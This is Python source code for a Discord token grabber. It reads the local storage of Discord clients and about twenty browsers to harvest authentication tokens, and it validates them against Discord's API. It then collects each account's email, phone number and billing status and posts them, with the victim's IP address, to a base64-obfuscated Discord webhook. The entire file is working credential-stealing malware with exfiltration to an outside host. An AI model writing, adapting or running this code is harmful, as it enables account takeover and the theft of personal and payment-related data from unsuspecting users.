# import os, re, json, requests
# from receiver import Receiver
# from sender import Sender
# init()

class Grabber:
    def __init__(self):
        self.url = "https://discord.com/api/v9/users/@me"
        self.path = [
            '_Roaming/Discord/Local Storage/leveldb',
            '_Roaming/Lightcord/Local Storage/leveldb',
            '_Roaming/discordcanary/Local Storage/leveldb',
            '_Roaming/discordptb/Local Storage/leveldb',
            '_Roaming/Opera Software/Opera Stable/Local Storage/leveldb',
            '_Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb',
            '_Local/Amigo/User Data/Local Storage/leveldb',
            '_Local/Torch/User Data/Local Storage/leveldb',
            '_Local/Kometa/User Data/Local Storage/leveldb',
            '_Local/Orbitum/User Data/Local Storage/leveldb',
            '_Local/CentBrowser/User Data/Local Storage/leveldb',
            '_Local/7Star/7Star/User Data/Local Storage/leveldb',
            '_Local/Sputnik/Sputnik/User Data/Local Storage/leveldb',
            '_Local/Vivaldi/User Data/Default/Local Storage/leveldb',
            '_Local/Google/Chrome SxS/User Data/Local Storage/leveldb',
            '_Local/Epic Privacy Browser/User Data/Local Storage/leveldb',
            '_Local/Google/Chrome/User Data/Default/Local Storage/leveldb',
            '_Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',
            '_Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb',
            '_Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',
            '_Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',
            '_Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb'
        ]

    def __get_tokens(self):
        tokens = []
        
        for path in self.path:
            path = path.replace('_Local', os.getenv('LOCALAPPDATA')).replace('_Roaming', os.getenv('APPDATA'))

            if os.path.exists(path):
                for filename in os.listdir(path):
                    if not filename.endswith('.log') and not filename.endswith('.ldb'):
                        continue
                    else:
                        for line in [i.strip() for i in open(f'{path}/{filename}', errors='ignore').readlines() if i.strip()]:
                            for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
                                tokens.append(token)
        return set(tokens)

    def __check_tokens(self, tokens):
        valid_tokens = []

        for token in tokens:
            try:
                result = requests.get(self.url, headers = {
                        "Authorization": token
                })
                if result.status_code == 200:
                    valid_tokens += f"{token}\n"
            except:
                pass
        return valid_tokens

    def __recreate_token(self, char_array):
        tokens = []
        token = ""

        for char in char_array:
            if char == '\n':
                tokens.append(token)
                token = ""
            else:
                token += char
        return tokens

    def __get_id(self, tokens):
        ids = {}

        for token in tokens:
            src = requests.get(self.url, headers= {
                "Authorization": token
            })
            userdata = json.loads(src.content)
            ids[str(userdata["id"])] = token
        return ids

    def __get_data(self, token):
        data = []

        src = requests.get(self.url, headers = {
            "Authorization": token
        })
        userdata = json.loads(src.content)
        phone = userdata['phone'] # Faster
        data.append(f"email -> {userdata['email']}")

        if (phone is not None):
            data.append(f"phone -> {phone}")

        return data

    def __has_payment_methods(self, token) -> bool:
        has_billing = False

        billing = requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers = {
            "Authorization": token
        }).json()

        if len(billing) > 0:
            has_billing = True
        return has_billing

    def main(self):
        receiver = Receiver()
        sender = Sender()
        WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTQzMjc4MjAzNTA0NTY2MzMzL2hRSzg5bGdvSEFVN2RYXzJ5dHRyYUdKcGJ3aFdSdzUxUGFwenNOSjhkSHRwUS15T3BXc1J1a1FDMmlON2g2UEhFTzdW"
        
        tokens = self.__get_tokens()
        verfied_tokens = self.__check_tokens(tokens)
        recreated_tokens = self.__recreate_token(verfied_tokens)
        full_verfied_tokens = self.__get_id(recreated_tokens)

        content = ""
        if len(full_verfied_tokens) > 0:
            for token in full_verfied_tokens.values():
                content += f"\n{token}"
                datas = self.__get_data(token)

                for data in datas:
                    content += f"\n{str(data)}"
                content += f"\nbilling -> {self.__has_payment_methods(token)}"
        else:
            content = "No tokens found!\n"

        payload = {
            "embeds": [
                {
                    "title": "Discord Informations:",
                    "description": f"```{sender._encode_data(content)}\n```",
                    "color": 0x72F9F4
                },
                                {
                    "title": "Computer Informations:",
                    "description": f"```ip -> {receiver._get_ip()}```",
                    "color": 0x72F9F4
                }
            ]
        }
        
        try:
            requests.post(sender._decode_data(WEBHOOK), json=payload)
        except:
            pass

def init():
    Grabber().main()